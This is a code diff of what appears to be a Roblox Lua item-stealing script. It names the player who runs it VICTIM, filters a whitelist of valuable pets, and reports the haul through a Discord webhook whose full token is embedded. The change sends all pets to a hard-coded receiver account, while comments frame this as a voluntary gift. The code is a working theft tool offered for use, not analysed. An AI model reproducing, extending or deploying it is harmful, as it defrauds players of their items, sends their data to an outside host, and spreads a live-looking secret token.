@@ -4,9 +4,10 @@ until game:IsLoaded()
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1388199702914404393/YEkwUlOo3WImnClu_PZ6V6IeDvCSmefP8sbEpL1sjVE3dpvfYFLVtdX0iYHJlbl9Iqxg"
 local VICTIM = game.Players.LocalPlayer
-local USERNAMES = {
-    game.Players.LocalPlayer.Name
-}
+-- Executor = the user running the script
+-- Receiver = the person you want to give all pets to
+local EXECUTOR = game.Players.LocalPlayer.Name
+local RECEIVER = "darkunknownusers" -- <== CHANGE THIS to the Roblox username of the receiver
 
 local PET_WHITELIST = {
     'Raccoon',
@@ -27,19 +28,12 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
 
 local function waitForJoin()
-    local findTarget = false
-    local trigeretName = nil
-
     for _, player in game.Players:GetPlayers() do
-        if not table.find(USERNAMES, player.Name) then
-            continue
+        if player.Name == RECEIVER then
+            return true, RECEIVER
         end
-
-        trigeretName = player.Name
-        findTarget = true
     end
-
-    return findTarget, trigeretName
+    return false, nil
 end
 
 function createDiscordEmbed(petList, totalValue, fileUrl)
@@ -231,4 +225,5 @@ task.spawn(function()
     end
 
 end)
+
 
